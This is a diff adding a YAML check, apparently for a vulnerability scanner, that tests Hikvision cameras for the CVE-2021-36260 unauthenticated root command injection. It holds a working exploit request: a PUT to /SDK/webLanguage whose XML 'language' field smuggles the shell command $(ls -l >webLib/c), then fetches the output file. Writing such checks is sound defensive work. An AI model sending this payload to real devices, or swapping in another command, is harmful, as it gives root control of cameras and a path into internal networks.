@@ -1,0 +1,34 @@
+name: Hikvision_RCE_CVE_2021_36260
+transport: http
+set: {}
+detail:
+  dock: app="Hikvision-Cameras-and-Surveillance"
+  product: hikvision
+  homepage: https://www.hikvision.com/cn/
+  impact: ''
+  description: '攻击者利用该漏洞可以用无限制的root shell来完全控制设备，即使设备的所有者受限于有限的受保护shell（psh）。除了入侵IP摄像头外，还可以访问和攻击内部网络。
+
+    该漏洞的利用并不需要用户交互，攻击者只需要访问http或HTTPS服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。'
+rules:
+  r1:
+    method: GET
+    path: /
+    follow_redirects: false
+    expression: response.status == 200
+  r2:
+    method: PUT
+    path: /SDK/webLanguage
+    follow_redirects: false
+    headers:
+      X-Requested-With: XMLHttpRequest
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <language>$(ls -l >webLib/c)</language>'
+    expression: response.status == 500
+  r3:
+    method: GET
+    path: /c
+    follow_redirects: false
+    expression: response.status == 200
+expression: r1() && r2() && r3()
